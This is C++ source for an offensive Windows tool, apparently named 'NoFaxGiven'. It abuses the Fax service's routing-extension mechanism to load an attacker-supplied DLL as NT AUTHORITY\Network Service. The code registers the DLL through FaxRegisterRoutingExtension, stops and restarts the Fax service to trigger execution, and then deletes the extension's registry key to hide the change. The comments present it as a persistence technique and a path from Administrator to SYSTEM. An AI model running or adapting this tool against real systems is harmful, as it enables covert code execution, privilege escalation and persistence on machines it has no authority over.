// NoFaxGiven - persists/exec a DLL as NT AUTHORITY\Network Service.
// =================================================================
// A fax routing extension is a DLL that adds routing functionality to the fax service. Multiple 
// fax routing extensions can reside on one server. When the fax server receives a fax transmission, 
// it routes the received document through each of the fax routing extensions in order of priority. 
// A user sets the routing priority using the fax service administration application, a Microsoft 
// Management Console (MMC) snap-in component. The FAX service runs manually when an application 
// requests a connection to the FAX service, (such as when loading fxsadmin in MMC). On Desktops the
// service is present but will timeout when attempting to set extensions as requires config & role. 
// More on MSDN. Administrator rights are required to interact with the service by default, if a 
// user has the FAX Config roles to the FAX service and is elevated then they may extend the FAX service.
// 
// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/fax/-mfax-fax-routing-extension
//
// We can persist inside the FAX service - our DLL will be called each time the service is started, 
// which is not automatically called on a reboot so would only offer persistence on servers that 
// are actively using FAX features, it also offers an attacker an alternative pathway to SYSTEM from 
// Administrator privileges as you can escalate from the Network Service to SYSTEM.
//
#ifdef _M_X64
#define WIN32 0
#else
#endif
#include <WinFax.h>
#include <FaxComEx.h>
#include <iostream>
#include <string.h>
#include <Windows.h>
#include <time.h>
#include <faxcomex_i.c>
#include <tchar.h>
#include <winsvc.h>
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"winfax.lib")
using namespace std;

BOOL PfaxRoutingInstallationCallbackw(HANDLE FaxHandle,LPVOID Context, LPWSTR MethodName, LPWSTR FriendlyName, LPWSTR FunctionName, LPWSTR Guid)
{
	return 0;
}

int main(int argc, char* argv[])
{
    HANDLE hFaxServer;
    LPWSTR pDLLpath;
    DWORD dwError;
    size_t sSize;
    BOOL bRet = false;
    if (argc != 2) {
        printf("[!] Error, you must supply a path to a DLL\n");
        return EXIT_FAILURE;
    }
    pDLLpath = new TCHAR[MAX_PATH + 1];
    mbstowcs_s(&sSize, pDLLpath, MAX_PATH, argv[1], MAX_PATH);
    bRet = FaxConnectFaxServer(NULL, &hFaxServer);
    if (bRet)
        printf("[+] Sucess connecting to Fax Service\n");
    // FAX services has internal roles, can check if have the FAX config role here and bail if not.

    /* These two names are exported in FAX_INFO structures, extension name & human readable friendly name (description) - could be randomized */
    bRet = FaxRegisterRoutingExtension(hFaxServer, (LPWSTR)L"FaxOff", (LPWSTR)L"FaxRouteMethod", pDLLpath, (PFAX_ROUTING_INSTALLATION_CALLBACKW)PfaxRoutingInstallationCallbackw, NULL);
    dwError = GetLastError();
    printf("[-] FaxRegisterRoutingExtension GetLastError() return %d\n", dwError);
    if (dwError == 5) {
        printf("[-] Access denied\n");
        return EXIT_SUCCESS;
    }
    FaxClose(hFaxServer);
    printf("[-] Stopping FAX service...\n");
    // should wait here properly by checking SCM, lazy to sleep
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    SERVICE_STATUS_PROCESS ssp;
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);  // full access rights 
    schService = OpenService(schSCManager, L"Fax", SERVICE_ALL_ACCESS);
    ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssp);
    // this is not an elegant way to wait for a service but it works.
    Sleep(5000);
    // We need to reconnect to the service to launch our DLL. (service starts on-demand)
    bRet = FaxConnectFaxServer(NULL, &hFaxServer);
    if (bRet) {
      printf("[+] Sucess re-connecting to Fax Service\n");
    }
    /* Remove this call here if you want to persist everytime it calls FAX service (such as when connecting via mmc fxsadmin or using "net start fax"). */ 
    if (RegDeleteTree(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Fax\\Routing Extensions\\FaxOff")) {
        printf("[-] error deleting the extension!\n");
    }
    FaxClose(hFaxServer);
    printf("[+] Done\n");
    return EXIT_SUCCESS;
}
